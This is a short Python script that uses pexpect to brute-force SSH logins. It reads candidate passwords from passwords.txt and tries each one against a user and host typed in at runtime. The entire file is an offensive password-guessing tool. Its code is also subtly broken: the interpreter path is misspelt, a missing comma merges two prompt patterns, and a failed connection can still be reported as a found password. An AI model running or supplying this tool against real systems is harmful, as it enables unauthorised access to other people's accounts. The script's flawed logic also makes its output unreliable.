#!/ur/bin/env python

# Author:Gokan Bektas
# Description: 

import pexpect #allow us to send particular target 
from termcolor import colored

PROMPT = ['# ', '>>> ', '>' '\$ ']

def send_command(child, command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)
    
def connect(user, host, password):
    ssh_newkey = "Are you sure you want to continue connecting? "
    connStr = 'ssh ' + user + '@' + host #domain - IP address
    child = pexpect.spawn(connStr) #spawn allows us to send and expect respond... run commands only sends which we dont use here.
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: ']) 
    if ret == 0:
        print('[-] Error Connecting') 
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-]Error Connecting')
            return
    child.sendline(password)
    child.expect(PROMPT)
    return child
    
def main():
    host = input("Please enter the host target to bruteforce: ")
    user = input("Please enter the user target to bruteforce: ")
    file = open('passwords.txt', 'r')
    for password in file.readlines():
        password = password.strip('\n')
        try:
            chil = connect(user, host, password)
            print(colored('[+] Password found: ' + password, 'blue'))
        
        except:
            print(colored('[-] Wrong password ' + password, 'red'))
            
    
main()